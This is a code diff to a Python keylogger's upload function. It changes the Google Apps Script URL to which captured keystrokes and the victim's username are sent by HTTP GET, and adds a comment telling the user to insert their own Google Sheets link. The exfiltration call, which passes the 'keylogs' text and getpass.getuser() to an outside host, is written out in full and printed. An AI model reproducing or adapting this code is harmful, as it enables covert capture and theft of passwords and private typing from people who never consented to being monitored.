@@ -60,8 +60,9 @@ def write_to_gsheets():
     global text
     try:
         if text !="":
-            requests.get('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWS1nUZQoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text)) 
-            print('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWS1nUZQoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text))
+            #update your google sheets link here
+            requests.get('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text)) 
+            print('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text))
     except Exception as e:
         print(e)
 
